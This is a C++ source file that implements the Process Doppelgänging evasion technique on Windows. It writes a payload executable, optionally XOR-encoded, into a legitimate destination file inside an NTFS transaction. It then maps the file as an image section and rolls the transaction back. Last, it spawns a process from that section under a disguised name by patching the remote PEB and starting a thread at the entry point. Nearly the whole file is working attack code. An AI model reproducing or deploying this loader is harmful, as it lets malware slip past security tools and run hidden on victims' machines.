// owoganger.cpp : Defines the entry point for the console application.
//

#pragma once //circular dependencies ehh
#include "stdafx.h"
#include "typedefs.h"
#include <iostream>
#include <iomanip>
#include <vector>
#include "owoganger.h"
#include "argParser.h"
#include "atlbase.h"
#include "dbghelp.h"
#include "decoder.h"
//#include <Ntdef.h> weird errors if including



owoganger::owoganger(std::string source, std::string dest, DWORD fileFormat)
{
	USES_CONVERSION;
	this->source = A2W(source.c_str());
	this->destination = A2W(dest.c_str());
	this->SOURCE_FILE_FORMAT = fileFormat;
	this->exeBuf = new std::vector<BYTE>;
	ntdll = GetModuleHandle(TEXT("ntdll.dll"));
	//GO
	this->transact();
}

owoganger::owoganger(std::string source, std::string dest, DWORD fileFormat, std::string xor_key)
{
	USES_CONVERSION;
	this->source = A2W(source.c_str());
	this->destination = A2W(dest.c_str());
	this->SOURCE_FILE_FORMAT = fileFormat;
	this->XOR_KEY = xor_key;
	this->exeBuf = new std::vector<BYTE>;
	ntdll = GetModuleHandle(TEXT("ntdll.dll"));
	//GO
	this->transact();
}

owoganger::~owoganger()
{
	CloseHandle(ntdll);
}

void owoganger::transact()
{
	HANDLE hTransaction = 0;
	HANDLE hDestFile = 0;
	HANDLE hSourceFile = 0;


	hTransaction = CreateTransaction(NULL, NULL, NULL, NULL, NULL, NULL, NULL);
	if (hTransaction == INVALID_HANDLE_VALUE) {
		std::cout << "Error during transcation creation" << std::endl;
		exit(-1);
	}
	hDestFile = CreateFileTransacted(this->destination, (GENERIC_READ | GENERIC_WRITE), 0, NULL, CREATE_ALWAYS/*must overwrite*/, FILE_ATTRIBUTE_NORMAL, NULL, hTransaction, NULL, NULL);
	if (GetLastError() != 183) { // means file doesn't exist, so technique is kinda useless
		std::cout << "File at destination path isn't accessible to write or doesn't exist" << std::endl;
		exit(-2);
	}
	//read data from source file into buffer
	readFile();

	BYTE tmp[MAX_BUF_SIZE]{ 0 };
	size_t vectorSize = exeBuf->size();
	size_t curSize = 0;
	size_t offset = MAX_BUF_SIZE;
	while (TRUE) { //writing buffer by chunks
		if (curSize == vectorSize) {
			break;
		}
		if (vectorSize < MAX_BUF_SIZE) {
			memcpy(tmp, exeBuf->data(), vectorSize);
			WriteFile(hDestFile, tmp, vectorSize, NULL, NULL);
			break;
		}
		else if(offset < MAX_BUF_SIZE){ // first time ain't gonna work
			memcpy(tmp, (exeBuf->data()+curSize), offset);
			WriteFile(hDestFile, tmp, offset, NULL, NULL);
			break;
		}
		else { // will be set here
			memcpy(tmp, (exeBuf->data()+curSize), MAX_BUF_SIZE);
			curSize += MAX_BUF_SIZE;
			offset = vectorSize - curSize;
			WriteFile(hDestFile, tmp, MAX_BUF_SIZE, NULL, NULL);
			
		}
		
	}

	//if (WriteFile(hDestFile, &exeBuf[0], exeBuf.size(), NULL, NULL) != TRUE) {
	//	std::cout << "Error during transacted file write" << std::endl;
	//	exit(-7);
	//}
	this->load(hDestFile, hTransaction); // going to step 2


}

void owoganger::load(HANDLE hDestFile, HANDLE hTransaction)
{


	HANDLE hSection = 0;
	pNtCreateSection NtCreateSection = (pNtCreateSection)GetProcAddress(this->ntdll, "NtCreateSection");
	if (NtCreateSection == 0) {
		std::cout << "can't find NtCreateSection" << std::endl;
		exit(-8);
	}

	NTSTATUS res = NtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, 0, PAGE_READONLY, SEC_IMAGE, hDestFile);
	if (checkNtStatus(&res) != TRUE) {
		std::cout << "Error during section creation" << std::endl;
		exit(-9);
	}
	this->rollback(hTransaction); // step 3
	CloseHandle(hTransaction);
	this->animate(hSection); // final step

}

void owoganger::rollback(HANDLE hTransaction)
{
	if (RollbackTransaction(hTransaction) == 0) {
		std::cout << "Can't rollback transaction" << std::endl;
		exit(-10);
	}
}

void owoganger::animate(HANDLE hSection)
{
	HANDLE hProc = 0;
	HANDLE hThread = 0;
	NTSTATUS res = 0;
	PROCESS_BASIC_INFORMATION procBasicInfo = { 0 };
	PROCESSINFOCLASS procInfo = ProcessBasicInformation;
	PVOID pPeb = 0;
	ULONG_PTR EntryPoint = 0, ib = 0;
	UNICODE_STRING path, dllpath, procName;
	PRTL_USER_PROCESS_PARAMETERS ProcParams = NULL;
	PIMAGE_NT_HEADERS ntHeaders = NULL;

	//BSOD soon :)
	pNtCreateProcessEx NtCreateProcessEx = (pNtCreateProcessEx)GetProcAddress(this->ntdll, "NtCreateProcessEx");
	pNtQueryInformationProcess NtQueryInformationProcess = (pNtQueryInformationProcess)GetProcAddress(this->ntdll, "NtQueryInformationProcess");
	pNtReadVirtualMemory NtReadVirtualMemory = (pNtReadVirtualMemory)GetProcAddress(this->ntdll, "NtReadVirtualMemory");
	pRtlImageNtHeader RtlImageNtHeader = (pRtlImageNtHeader)GetProcAddress(this->ntdll, "RtlImageNtHeader");
	pRtlCreateProcessParametersEx RtlCreateProcessParametersEx = (pRtlCreateProcessParametersEx)GetProcAddress(this->ntdll, "RtlCreateProcessParametersEx");
	pRtlInitUnicodeString RtlInitUnicodeString = (pRtlInitUnicodeString)GetProcAddress(this->ntdll, "RtlInitUnicodeString");
	pNtCreateThreadEx NtCreateThreadEx = (pNtCreateThreadEx)GetProcAddress(this->ntdll, "NtCreateThreadEx");
	pNtAllocateVirtualMemory NtAllocateVirtualMemory = (pNtAllocateVirtualMemory)GetProcAddress(this->ntdll, "NtAllocateVirtualMemory");
	pNtWriteVirtualMemory NtWriteVirtualMemory = (pNtWriteVirtualMemory)GetProcAddress(this->ntdll, "NtWriteVirtualMemory");
	// TODO try with PsCreateMinimalProcess
	if (NtCreateProcessEx == 0) {
		std::cout << "Can't find NtCreateProcessEx" << std::endl;
		CloseHandle(hSection);
		exit(-11);
	}
	if (NtQueryInformationProcess == 0) {
		std::cout << "Can't find NtQueryInformationProcess" << std::endl;
		exit(-13);
	}
	if (RtlImageNtHeader == 0) {
		std::cout << "Can't find RtlImageNtHeader" << std::endl;
		exit(-15);
	}
	if (RtlCreateProcessParametersEx == 0) {
		std::cout << "Can't find RtlCreateProcessParametersEx" << std::endl;
		exit(-16);
	}

	if (RtlInitUnicodeString == 0) {
		std::cout << "Can't find RtlInitUnicodeString" << std::endl;
		exit(-17);
	}
	if (NtCreateThreadEx == 0) {
		std::cout << "Can't find NtCreateThreadEx" << std::endl;
		exit(-22);
	}

	//INIT PARAMETERS
	RtlInitUnicodeString(&path, (PCWSTR)(this->destination));
	RtlInitUnicodeString(&dllpath, (PCWSTR)(L"C:\\Windows\\System32"));
	RtlInitUnicodeString(&procName, (PCWSTR)(L"owo what's this"));
	res = RtlCreateProcessParametersEx(&ProcParams, &path, &dllpath, NULL, &path, NULL, &procName, NULL, NULL, NULL, RTL_USER_PROC_PARAMS_NORMALIZED);

	res = NtCreateProcessEx(&hProc, GENERIC_ALL, NULL, GetCurrentProcess(), 4/*PS_INHERIT_HANDLES*/, hSection, NULL, NULL, FALSE);
	if (checkNtStatus(&res) != TRUE) {
		std::cout << GetLastError() << std::endl;
		std::cout << (PVOID)res << std::endl;
		std::cout << "Can't create process" << std::endl;
		exit(-12);
	}

	//get entry point
	//ain't gonna work if PE_HEADER destroyed :)

	res = NtQueryInformationProcess(hProc, ProcessBasicInformation, &procBasicInfo, sizeof(PROCESS_BASIC_INFORMATION), NULL);
	if (checkNtStatus(&res) != TRUE) {
		std::cout << "Can't find entry point" << std::endl;
		exit(-14);
	}
	LPVOID rPebAddr = procBasicInfo.PebBaseAddress;


	pPeb = procBasicInfo.PebBaseAddress;
	ntHeaders = ImageNtHeader(&((*this->exeBuf)[0])); // uhh
	if (ntHeaders == NULL) {
		std::cout << "Can't find NTheaders in exe" << std::endl;
		exit(-49);
	}

	//still searching entry point
	BYTE  tmpbuf[MAX_BUF_SIZE]{ 0 };
	ReadProcessMemory(hProc, pPeb, &tmpbuf, MAX_BUF_SIZE, NULL);
	EntryPoint = (ULONG_PTR)ntHeaders->OptionalHeader.AddressOfEntryPoint;
	//EntryPoint += (ULONG_PTR)((PPEB)tmpbuf)->ImageBaseAddress;
	


	if (checkNtStatus(&res) != TRUE) {
		std::cout << "Error during process parameters creation" << std::endl;
		exit(-18);
	}
	SIZE_T size = ProcParams->EnvironmentSize+ProcParams->MaximumLength;
	PVOID memoryPtr = ProcParams;
	res = NtAllocateVirtualMemory(hProc,&memoryPtr,0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	/*if (rParamsAddr == NULL) {
		std::cout << "Failed to allocate memory for parameters" << std::endl;
		exit(-19);
	}*/
	 if(!WriteProcessMemory(hProc, ProcParams, ProcParams, ProcParams->EnvironmentSize + ProcParams->MaximumLength, &size))
	{
		std::cout << "Failed to write to process memory" << std::endl;
		exit(-20);
	}
	//I FUCKING HATE IT
	PEB pebBuf;
	//PVOID rPebAddr = procBasicInfo.PebBaseAddress;
	
	SIZE_T bytesRead = 0;
	ReadProcessMemory(hProc, rPebAddr, &pebBuf, sizeof(pebBuf), &bytesRead);
	//std::cout << GetLastError() << std::endl;
	if (checkNtStatus(&res) != TRUE) {
		std::cout << "Failed to fetch remote PEB" << std::endl;
		exit(-30);
	}
	EntryPoint += (ULONG_PTR)pebBuf.ImageBaseAddress;

	//update parameters address in peb. Since there are no params yet, we need to calculate offset and put our new address
	ULONGLONG paramsOffset = (ULONGLONG)&pebBuf.ProcessParameters - (ULONGLONG)&pebBuf;
	LPVOID rPebParamsAddr = (LPVOID)((ULONGLONG)rPebAddr + paramsOffset);// YAY MATH
	if(!WriteProcessMemory(hProc, rPebParamsAddr, &ProcParams, sizeof(PVOID), NULL))
	{
		
		std::cout << GetLastError() << std::endl;
		std::cout << "Failed to change PEB parameters address" << std::endl;
		exit(-21);
	}
	std::cout.fill('0'); 
	std::cout << "[+] PEB addr\t\t" << std::setw(16) << std::hex << rPebAddr << std::endl;
	std::cout << "[+] PEB params addr\t" << std::setw(16) << std::hex << rPebParamsAddr << std::endl;
	std::cout << "[+] Params addr\t\t" << std::setw(16) << std::hex << &ProcParams << std::endl;
	std::cout << "[+] Entry point\t\t" << std::setw(16) << std::hex << EntryPoint << std::endl;
	std::cout << "[+] Image base\t\t" << std::setw(16) << std::hex << (ULONG_PTR)pebBuf.ImageBaseAddress << std::endl;
	std::cout << "[+] Process PID\t\t" << std::dec << GetProcessId(hProc) << std::endl;
	//debug checks
	PEB copy = { 0 };
	ReadProcessMemory(hProc, rPebAddr, &copy, sizeof(pebBuf), &bytesRead);

	res = NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProc, (LPTHREAD_START_ROUTINE)EntryPoint, NULL, FALSE, 0, 0, 0, NULL);
	if (checkNtStatus(&res) != TRUE) {
		std::cout << "Failed to create Thread" << std::endl;
		std::cout << (PVOID)res << std::endl;
		exit(-40);
	}
	//ResumeThread(hThread);
	//LOOKS LIKE WE'RE DONE
	std::cout << "[+] Process opened" << std::endl;




}

BOOL owoganger::checkNtStatus(NTSTATUS* res)
{
	if ((*res >= 0x0 && *res <= 0x3FFFFFFF) || (*res >= 0x40000000 && *res <= 0x7FFFFFFF)) {
		return TRUE;
	}
	return FALSE;
}

void owoganger::readFile()
{
	PLARGE_INTEGER fileSize = NULL;
	HANDLE hSourceFile = 0;
	BOOL eofFlag = FALSE;
	BYTE *tmpBuf = new BYTE[MAX_BUF_SIZE];
	DWORD bytesRead = 0;
	//DWORD bytesToRead = MAX_BUF_SIZE

	hSourceFile = CreateFile(this->source, GENERIC_READ, 0, 0, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hSourceFile == INVALID_HANDLE_VALUE) {
		std::cout << "Error while opening source file" << std::endl;
		exit(-4);
	}
	if (GetLastError() != 183) {
		std::cout << "Source file doesn't exist or can't be opened" << std::endl;
		CloseHandle(hSourceFile);
		exit(-5);
	}
	while (TRUE) {//reading file by chunks
		eofFlag = ReadFile(hSourceFile, tmpBuf, MAX_BUF_SIZE, &bytesRead, NULL);
		if (bytesRead != 0) {
			this->exeBuf->insert(exeBuf->end(), tmpBuf, tmpBuf + bytesRead);
		}
		if (eofFlag == TRUE && bytesRead == 0) {
			break; //encountered EOF
		}
	}
	this->exeBuf->shrink_to_fit();
	// check if it's in different format.
	
	if (this->SOURCE_FILE_FORMAT == SOURCE_XOR) {
		decoder *Decoder = new decoder(this->SOURCE_FILE_FORMAT, this->exeBuf,this->XOR_KEY);
		Decoder->initDecode();
		//now our buffer should be decoded
	}
	return;
}

int main(int argc, char** argv)
{
	argParser parser = argParser(argc, argv);
	//std::cout << "Injected" << std::endl;
	//system("pause");
	return 0;
}
